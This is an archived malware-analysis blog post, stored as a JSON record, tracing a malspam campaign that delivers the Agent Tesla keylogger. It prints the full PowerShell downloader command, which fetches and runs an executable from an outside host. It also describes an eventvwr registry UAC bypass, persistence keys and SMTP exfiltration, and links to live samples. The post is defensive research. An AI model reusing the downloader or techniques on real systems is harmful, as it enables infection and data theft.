{
    "id": "1f93f8c2-d9e1-4fb1-99a5-9d7c68d2109e",
    "created_at": "2023-01-12T15:10:57.936536Z",
    "updated_at": "2025-03-27T02:05:19.109185Z",
    "deleted_at": null,
    "sha1_hash": "c9417b98a58e93b737370230469bbee156971e0b",
    "title": "2018-01-11 - Malspam Entitled “Invoice attched for your reference” Delivers Agent Tesla Keylogger",
    "authors": "",
    "file_creation_date": "2022-05-28T15:30:44Z",
    "file_modification_date": "2022-05-28T15:30:44Z",
    "file_size": 1221133,
    "plain_text": "# Malspam Entitled “Invoice attched for your reference” Delivers Agent Tesla Keylogger\n\n**malwarebreakdown.com/2018/01/11/malspam-entitled-invoice-attched-for-your-reference-delivers-agent-tesla-**\nkeylogger/\n\nJanuary 11, 2018\n\nI recently got my hands on some malspam entitled “Invoice attched for your reference.”\nBelow is an image of the email:\n\n\n-----\n\nSender address ap@superstudio.me\n\nThe image of a PDF document links to hxxp://dropcanvas.com/ozbak/1:\n\n\n-----\n\nDropcanvas.com is a site used to transfer files between users. While not inherently\nmalicious, file sharing sites are often abused in these types of social engineering schemes.\n\nClicking on the link in the email downloads PI2983793.doc, which contains an embedded\nVBA macro acting as a downloader.\n\n[For anyone interested, I uploaded the obfuscated macro to Pastebin. If you don’t have the](https://pastebin.com/0CvqnM06)\ntime to statically analyze the macro, then there are numerous dynamic analysis techniques\nyou could use to retrieve the malicious script.\n\nThe example below shows the VBA debugging tool built into Office being used to retrieve the\nPowerShell script containing the malicious URL:\n\n\n-----\n\nFull script:\n```\npowershell.exe -WindowStyle Hidden -noprofile If (test-path $env:APPDATA +\n'u7cm.exe') {Remove-Item $env:APPDATA + 'u7cm.exe'}; $KDFB = New-Object\nSystem.Net.WebClient; $KDFB.Headers['User-Agent'] = 'USRUE-VNC';\n$KDFB.DownloadFile('hxxps://authenticrecordsonline[.]com/costman/dropcome.exe',\n$env:APPDATA + 'u7cm.exe'); (New-Object -com\nShell.Application).ShellExecute($env:APPDATA + 'u7cm.exe'); Stop-Process -Id\n$Pid -Force\n\n```\nWe can also verify that, as shown in the script above, it uses the User-Agent “USRUE-VNC”\nwhen downloading the malware payload:\n\n\n-----\n\npowershell.exe created file u7cm.exe in %AppData% and then creates process u7cm.exe\n(PID: 5012).\n\nStatic analysis shows it was built with .Net Framework\n\nSide note… on my first run I had a popup request to download .NET Framework 3.5:\n\n\n-----\n\nI then enabled .NET Framework 3.5 through Windows Features, restarted the system, and\nresumed dynamic analysis of the sample.\n\nNext, u7cm.exe (PID: 5012) created a hidden copy of itself at %AppData%jafjaf.exe. I unhid\nthe file and took a screenshot, shown below:\n\nu7cm.exe (PID: 5012) then sets the autostart registry key\nHKCUSOFTWAREMicrosoftWindowsCurrentVersionRunjaf:\n\n\n-----\n\nLater we see u7cm.exe (PID: 5012) create “u7cm.exe” (PID: 3296) as a new\nprocess, u7cm.exe (PID: 5012) creates a log file\nat %LocalAppData%MicrosoftCLR_v2.0_32UsageLogs and writes to it, and then u7cm.exe\n(PID: 5012) kills its own process.\n\nu7cm.exe (PID: 3296) sets registry key\nHKCUSoftwareClassesmscfileshellopencommand(Default):\n\nAnother view showing the value being set:\n\nNext, u7cm.exe (PID: 3296) creates process eventvwr.exe, both PID 5856 and PID 6096.\nPID 6096, running with High integrity, creates powershell.exe (PID: 3036), which then creates\nprocess u7cm.exe (PID: 2384) with a High integrity level. An example of this can be seen in\nthe process tree and currently running processes:\n\n\n-----\n\nhttps://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registryhijacking/\n\nFinally, we see u7cm.exe (PID: 3296) create and write to OFd.exe (PID: 6108) in %Temp%:\n\nAgent Tesla keylogger saving images of my Desktop in %AppData%ScreenShot:\n\nShout-out to Vitali Kremez [@VK_Intel for identifying this malware sample as Agent Tesla.](https://twitter.com/VK_Intel)\nAccording to other research done on this malware, the logged keystroke information is saved\nat %Temp%log.tmp in plain-text, however, I couldn’t find similar files on my system.\n\nHere are some additional references detailing the functionality of Agent Tesla:\n\nhttps://www.zscaler.com/blogs/research/agent-tesla-keylogger-delivered-usingcybersquatting\n\nhttps://community.rsa.com/community/products/netwitness/blog/2017/07/14/malspamdelivers-agenttesla-spyware\n\n[https://cysinfo.com/agent-tesla-new-spyware-variant-plucked-hackers-arena/](https://cysinfo.com/agent-tesla-new-spyware-variant-plucked-hackers-arena/)\n\n[https://blog.fortinet.com/2017/06/28/in-depth-analysis-of-net-malware-javaupdtr](https://blog.fortinet.com/2017/06/28/in-depth-analysis-of-net-malware-javaupdtr)\n\nNetwork Based IOCs\n\n69.55.50.17 – hxxp://dropcanvas.com – GET /ozbak/1 – Returned a 302 Found\n\n\n-----\n\n69.55.50.17 – hxxp://s.dropcanvas.com – GET\n/1000000/937000/936784/PI2983793.doc – Malicious .doc\n216.222.194.166 – hxxps://authenticrecordsonline.com – GET /costman/dropcome.exe\n– Malware payload\n216.146.38.70 – checkip.dyndns.org – IP check\n204.141.32.118 – DNS requests for smtp.zoho.com\n204.141.32.118 – mx.zohomail.com – Connections via TCP port 587 – exfiltrates data\nvia SMTP\n\nAdditional details from the TCP connections:\n\n==================================================\nRemote Address : 216.222.194.166\nRemote Host Name : vmcp06.myhostcenter.com\nRemote Port : 443\nProcess Name : powershell.exe\nProcess Path : C:WindowsSystem32WindowsPowerShellv1.0powershell.exe\n==================================================\n\n==================================================\nRemote Address : 216.146.38.70\nRemote Host Name : checkip-iad.dyndns.com\nRemote Port : 80\nProcess Name : u7cm.exe\nProcess Path : C:Users<Username>AppDataRoamingu7cm.exe\n==================================================\n\n==================================================\nRemote Address : 204.141.32.118\nRemote Port : 587\nProcess ID : 3296\nProcess Name : u7cm.exe\nProcess Path : C:Users<Username>AppDataRoamingu7cm.exe\n==================================================\n\nImage of HTTP and HTTPS traffic:\n\nHashes and Reports\n\n\n-----\n\n[SHA256: 8b1e45c9d170a81ea1077ab267915de0b00cf9ffcf62d2f62242696288c8756f](https://www.virustotal.com/en/file/8b1e45c9d170a81ea1077ab267915de0b00cf9ffcf62d2f62242696288c8756f/analysis/)\nFile name: PI2983793.doc\n[Hybrid-Analysis Report](https://www.hybrid-analysis.com/sample/8b1e45c9d170a81ea1077ab267915de0b00cf9ffcf62d2f62242696288c8756f?environmentId=100)\n\n[SHA256: d37b82b1a39f2d35d02240835ddaeab5d4a110b44087ede2b2fbd8e4679dd5f4](https://www.virustotal.com/en/file/d37b82b1a39f2d35d02240835ddaeab5d4a110b44087ede2b2fbd8e4679dd5f4/analysis/)\nFile name: dropcome.exe\n[Hybrid-Analyis Report](https://www.hybrid-analysis.com/sample/d37b82b1a39f2d35d02240835ddaeab5d4a110b44087ede2b2fbd8e4679dd5f4?environmentId=100)\n\n[SHA256: c2cae82e01d954e3a50feaebcd3f75de7416a851ea855d6f0e8aaac84a507ca3](https://www.virustotal.com/en/file/c2cae82e01d954e3a50feaebcd3f75de7416a851ea855d6f0e8aaac84a507ca3/analysis/)\nFile name: OFd.exe\n[Hybrid-Analysis Report](https://www.hybrid-analysis.com/sample/c2cae82e01d954e3a50feaebcd3f75de7416a851ea855d6f0e8aaac84a507ca3?environmentId=100)\n\nDownloads\n\n[Malicious Artifacts.zip](https://malwarebreakdown.com/wp-content/uploads/2018/01/Malicious-Artifacts.7z)\n\nPassword is “infected”\n\n## Published by malwarebreakdown\n\nJust a normal person who spends their free time infecting systems with malware. View all\nposts by malwarebreakdown\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-01-11 - Malspam Entitled “Invoice attched for your reference” Delivers Agent Tesla Keylogger.pdf"
    ],
    "report_names": [
        "2018-01-11 - Malspam Entitled “Invoice attched for your reference” Delivers Agent Tesla Keylogger.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536257,
    "ts_updated_at": 1743041119,
    "ts_creation_date": 1653751844,
    "ts_modification_date": 1653751844,
    "files": {
        "pdf": "https://archive.orkl.eu/c9417b98a58e93b737370230469bbee156971e0b.pdf",
        "text": "https://archive.orkl.eu/c9417b98a58e93b737370230469bbee156971e0b.txt",
        "img": "https://archive.orkl.eu/c9417b98a58e93b737370230469bbee156971e0b.jpg"
    }
}